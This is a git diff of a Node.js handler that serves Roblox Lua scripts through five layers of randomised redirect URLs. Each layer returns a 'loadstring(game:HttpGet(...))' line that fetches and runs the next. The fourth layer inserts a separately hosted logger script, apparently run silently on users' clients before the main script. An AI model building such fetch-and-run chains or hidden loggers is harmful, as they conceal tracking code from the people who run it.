@@ -52,8 +52,7 @@ async function sendSecurityLogToLogJs(message, ip, type) {
 
 function makeSession(ownerIp, stepSequence, currentIndex, startTime) {
     const now = Date.now();
-    const rand = Math.random().toString(36).substring(2, 6);
-    const newSessionID = rand.padEnd(4, 'x');
+    const newSessionID = Math.random().toString(36).substring(2, 6).padEnd(4, 'x');
     const nextKey = Math.random().toString(36).substring(2, 8);
     const waitTime = Math.floor(Math.random() * (SETTINGS.MAX_WAIT - SETTINGS.MIN_WAIT)) + SETTINGS.MIN_WAIT;
 
@@ -155,36 +154,33 @@ module.exports = async function(req, res) {
                 if (!sequence.includes(r)) sequence.push(r);
             }
 
-            // currentIndex: 0 → layer pertama akan dicek di index 0
             const { newSessionID, nextKey, waitTime } = makeSession(cleanIp, sequence, 0);
-
             const firstStep = sequence[0];
             const nextUrl = "https://" + host + currentPath + "?" + firstStep + "." + newSessionID + "." + nextKey;
             const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
             return res.status(200).send(luaScript);
         }
 
-        // ========== AMBIL SESSION & INDEX SAAT INI ==========
         const session = sessions[id];
-        const idx = session.currentIndex; // index SEKARANG sebelum apapun
+        const idx = session.currentIndex;
 
         /*
-         * Mapping index ke layer (TOTAL_LAYERS = 5):
-         * idx 0 → layer 1 → redirect biasa (next idx 1)
-         * idx 1 → layer 2 → redirect biasa (next idx 2)
-         * idx 2 → layer 3 → redirect biasa (next idx 3)  ← batas: TOTAL_LAYERS - 3 = 2
-         * idx 3 → layer 4 → logger + redirect           ← TOTAL_LAYERS - 2 = 3
-         * idx 4 → layer 5 → main script                 ← TOTAL_LAYERS - 1 = 4
+         * TOTAL_LAYERS = 5, mapping idx:
+         * idx 0 → layer 1 → redirect biasa
+         * idx 1 → layer 2 → redirect biasa
+         * idx 2 → layer 3 → redirect biasa
+         * idx 3 → layer 4 → isi LOGGER SCRIPT saja (tanpa loadstring)
+         * idx 4 → layer 5 → isi MAIN SCRIPT saja
          */
 
-        // ========== LAYER TERAKHIR: MAIN SCRIPT ==========
+        // ========== LAYER 5 (idx = TOTAL_LAYERS - 1): MAIN SCRIPT SAJA ==========
         if (idx === SETTINGS.TOTAL_LAYERS - 1) {
             const mainScript = await fetchRaw(SETTINGS.REAL_SCRIPT_URL);
             delete sessions[id];
             return res.status(200).send(mainScript || '');
         }
 
-        // ========== LAYER LOGGER: LOAD LOGGER + REDIRECT KE LAYER TERAKHIR ==========
+        // ========== LAYER 4 (idx = TOTAL_LAYERS - 2): LOGGER SCRIPT + REDIRECT KE LAYER 5 ==========
         if (idx === SETTINGS.TOTAL_LAYERS - 2) {
             const nextIndex = idx + 1;
             const { newSessionID, nextKey, waitTime } = makeSession(
@@ -195,12 +191,13 @@ module.exports = async function(req, res) {
             const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
             const nextStepNumber = session.stepSequence[nextIndex];
             const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
+
+            // Logger script dijalankan dulu, lalu di baris terakhirnya loadstring ke layer 5
             const luaScript = (loggerScript || '') + "\ntask.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
             return res.status(200).send(luaScript);
         }
 
-        // ========== LAYER BIASA: REDIRECT ==========
-        // idx 0, 1, 2 (semua < TOTAL_LAYERS - 2)
+        // ========== LAYER 1-3 (idx 0,1,2): REDIRECT BIASA ==========
         const nextIndex = idx + 1;
         const { newSessionID, nextKey, waitTime } = makeSession(
             session.ownerIP, session.stepSequence, nextIndex, session.startTime
